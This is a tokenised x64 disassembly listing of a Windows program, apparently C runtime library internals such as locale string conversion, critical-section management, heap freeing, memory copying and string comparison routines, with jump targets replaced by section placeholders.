ja r-xdata
mov ecx [ rbp + 0x8 ]
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov r9d r15d
mov r8 rdi
mov edx r10d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
add rbx 0x10
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov eax [ rbp + 0x80 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
cmp eax ecx
jne r-xdata
call sub_140009570
xor r8d r8d
mov rbx rax
cmp rax r8
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_1400069d4
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x78 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
mov r10d [ rbp ]
jmp r-xdata
mov [ rax ] r14d
and rax 0xfffffffffffffff0
call sub_14000a7a0
sub rsp rax
lea rbx [ rsp + 0x40 ]
cmp rbx r8
je r-xdata
mov rax rbx
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp rbx r8
je r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
sub_1400063f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_1400023d8
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_140005eb0
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140006488
mov [ rsp + 0x20 ] r9d
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov r9d [ rw-data ]
mov edi 0x1
xor ebx ebx
mov r14 r8
mov r15d edx
mov r13 rcx
lea esi [ rdi + 0x1 ]
cmp r9d ebx
jne r-xdata
cmp r9d esi
je r-xdata
lea r9 [ rbp ]
lea rdx [ r--data ]
mov r8d edi
mov ecx edi
call [ GetStringTypeW@IAT ]
cmp eax ebx
je r-xdata
mov r12d [ rbp + 0x70 ]
mov rdi rbx
cmp r12d ebx
jne r-xdata
cmp r9d ebx
je r-xdata
call [ GetLastError@IAT ]
mov r9d [ rw-data ]
cmp eax 0x78
cmove r9d esi
mov [ rw-data ] r9d
mov [ rw-data ] edi
jmp r-xdata
mov esi [ rbp + 0x68 ]
cmp esi ebx
jne r-xdata
mov rax [ r13 ]
mov r12d [ rax + 0x14 ]
cmp r9d edi
jne r-xdata
mov esi [ rbp + 0x68 ]
cmp esi ebx
jne r-xdata
mov ecx r12d
call sub_140009294
cmp eax 0xffffffff
jne r-xdata
mov rax [ r13 ]
mov esi [ rax + 0x4 ]
xor eax eax
jmp r-xdata
neg [ rbp + 0x78 ]
mov r9d [ rbp + 0x58 ]
mov r8 r14
sbb edx edx
mov ecx esi
mov [ rsp + 0x28 ] ebx
and edx 0x8
mov [ rsp + 0x20 ] rbx
add edx edi
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
cmp r12d ebx
je r-xdata
mov rax [ r13 ]
mov esi [ rax + 0x4 ]
cmp eax esi
je r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_140002370
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r13d 0xdddd
jle r-xdata
mov rax [ rbp + 0x60 ]
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx r15d
mov ecx r12d
mov [ rsp + 0x20 ] rax
call [ GetStringTypeA@IAT ]
mov esi eax
cmp rdi rbx
je r-xdata
lea r9 [ rbp + 0x58 ]
mov r8 r14
mov edx eax
mov ecx esi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_1400092e8
mov rdi rax
cmp rax rbx
je r-xdata
mov rdi rbx
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov eax esi
mov rcx rdi
call sub_1400069d4
mov r14 rax
mov r8 r12
xor edx edx
mov rcx rdi
add r8 r8
call sub_140005d40
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] r13d
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rdi
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov ebx eax
call sub_140009570
mov rdi rax
cmp rax rbx
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax ebx
jmp r-xdata
call sub_1400069d4
cmp rdi rbx
je r-xdata
mov [ rax ] r13d
and rax 0xfffffffffffffff0
call sub_14000a7a0
sub rsp rax
lea rdi [ rsp + 0x30 ]
cmp rdi rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_1400066f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_1400023d8
mov eax [ rsp + 0xa0 ]
mov r11d [ rsp + 0xa8 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] r11d
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0x98 ]
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_140006488
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140006780
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor edi edi
mov rbx r12
lea rax [ rw-data ]
add rbx 0x10
inc edi
cmp rbx rax
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rbx ] rcx
call sub_140008ebc
test eax eax
je r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax edi
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_14000680c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
lea rbp [ rw-data ]
mov rdi rbx
add rdi 0x10
cmp rdi rbp
jl r-xdata
cmp [ rdi + 0x8 ] 0x1
je r-xdata
mov rsi [ rdi ]
test rsi rsi
je r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rsi
call [ DeleteCriticalSection@IAT ]
mov rcx rsi
call sub_1400069d4
and [ rdi ] 0x0
add rbx 0x10
cmp rbx rbp
jl r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_1400068a8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_1400050b4
lea ecx [ rsi + 0x1d ]
call sub_140004e8c
mov ecx 0xff
call sub_140004b10
mov ecx 0x28
call sub_140006a14
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_140006990
nop
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_140003b30
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
mov rcx rbx
call sub_1400069d4
nop
mov edx 0xfa0
mov rcx rbx
call sub_140008ebc
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_1400069d4
call sub_140003b30
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
sub_140006990
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_1400068a8
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_140004aa4
sub_1400069d4
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_140003b30
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_140003ae8
mov [ rbx ] eax
sub_140006a14
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor edi edi
mov rsi rcx
or ebp 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi ebp
cmp edi ebp
jne r-xdata
mov rcx rsi
call sub_140009570
mov rbx rax
test rax rax
jne r-xdata
sub_140006a80
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_140009630
mov rbx rax
test rax rax
jne r-xdata
sub_140006b04
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_1400096e0
mov rbx rax
test rax rax
jne r-xdata
sub_140006ba0
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_140006ed4
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_1400069d4
mov rcx [ rbx + 0x10 ]
call sub_1400069d4
mov rcx [ rbx + 0x18 ]
call sub_1400069d4
mov rcx [ rbx + 0x20 ]
call sub_1400069d4
mov rcx [ rbx + 0x28 ]
call sub_1400069d4
mov rcx [ rbx + 0x30 ]
call sub_1400069d4
mov rcx [ rbx ]
call sub_1400069d4
mov rcx [ rbx + 0x40 ]
call sub_1400069d4
mov rcx [ rbx + 0x48 ]
call sub_1400069d4
mov rcx [ rbx + 0x50 ]
call sub_1400069d4
mov rcx [ rbx + 0x58 ]
call sub_1400069d4
mov rcx [ rbx + 0x60 ]
call sub_1400069d4
mov rcx [ rbx + 0x68 ]
call sub_1400069d4
mov rcx [ rbx + 0x38 ]
call sub_1400069d4
mov rcx [ rbx + 0x70 ]
call sub_1400069d4
mov rcx [ rbx + 0x78 ]
call sub_1400069d4
mov rcx [ rbx + 0x80 ]
call sub_1400069d4
mov rcx [ rbx + 0x88 ]
call sub_1400069d4
mov rcx [ rbx + 0x90 ]
call sub_1400069d4
mov rcx [ rbx + 0x98 ]
call sub_1400069d4
mov rcx [ rbx + 0xa0 ]
call sub_1400069d4
mov rcx [ rbx + 0xa8 ]
call sub_1400069d4
mov rcx [ rbx + 0xb0 ]
call sub_1400069d4
mov rcx [ rbx + 0xb8 ]
call sub_1400069d4
mov rcx [ rbx + 0xc0 ]
call sub_1400069d4
mov rcx [ rbx + 0xc8 ]
call sub_1400069d4
mov rcx [ rbx + 0xd0 ]
call sub_1400069d4
mov rcx [ rbx + 0xd8 ]
call sub_1400069d4
mov rcx [ rbx + 0xe0 ]
call sub_1400069d4
mov rcx [ rbx + 0xe8 ]
call sub_1400069d4
mov rcx [ rbx + 0xf0 ]
call sub_1400069d4
mov rcx [ rbx + 0xf8 ]
call sub_1400069d4
mov rcx [ rbx + 0x100 ]
call sub_1400069d4
mov rcx [ rbx + 0x108 ]
call sub_1400069d4
mov rcx [ rbx + 0x110 ]
call sub_1400069d4
mov rcx [ rbx + 0x118 ]
call sub_1400069d4
mov rcx [ rbx + 0x120 ]
call sub_1400069d4
mov rcx [ rbx + 0x128 ]
call sub_1400069d4
mov rcx [ rbx + 0x130 ]
call sub_1400069d4
mov rcx [ rbx + 0x138 ]
call sub_1400069d4
mov rcx [ rbx + 0x140 ]
call sub_1400069d4
mov rcx [ rbx + 0x148 ]
call sub_1400069d4
mov rcx [ rbx + 0x150 ]
call sub_1400069d4
add rsp 0x20
pop rbx
sub_1400070c0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
add rsp 0x20
pop rbx
call sub_1400069d4
sub_140007108
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_1400069d4
add rsp 0x20
pop rbx
call sub_1400069d4
sub_1400071a0
push rbx
sub rsp 0x30
mov r9 rcx
test rcx rcx
je r-xdata
call sub_140003b30
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
inc rcx
sub rdx 0x1
jne r-xdata
mov al [ r8 ]
inc r8
mov [ rcx ] al
inc rcx
test al al
je r-xdata
mov [ r9 ] dl
jmp r-xdata
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] dl
call sub_140003b30
mov ebx 0x22
jmp r-xdata
add rsp 0x30
pop rbx
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_140003a60
mov eax ebx
sub_14000722c
push rbx
sub rsp 0x30
mov r11 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_140003b30
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] r9b
jmp r-xdata
add rsp 0x30
pop rbx
retn
mov r10 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] r8b
mov al [ r11 ]
inc r11
mov [ r10 ] al
inc r10
test al al
je r-xdata
mov al [ r11 ]
inc r11
mov [ r10 ] al
inc r10
test al al
je r-xdata
test r9 r9
jne r-xdata
sub r8 0x1
je r-xdata
test r8 r8
jne r-xdata
sub r8 0x1
jne r-xdata
mov [ r10 ] r9b
sub r9 0x1
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
jmp r-xdata
mov [ rcx ] 0x0
call sub_140003b30
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx - 0x1 ] r8b
lea eax [ r8 + 0x50 ]
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_140003a60
mov eax ebx
sub_140007304
push rbx
sub rsp 0x30
test rcx rcx
je r-xdata
call sub_140003b30
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_140003b30
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
inc r8
mov [ r9 ] al
inc r9
test al al
je r-xdata
add rsp 0x30
pop rbx
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_140003a60
mov eax ebx
sub_140007390
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_140007450
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_140007510
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_1400075f0
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_1400076a8
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_1400023d8
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1400076f0
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_1400023d8
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
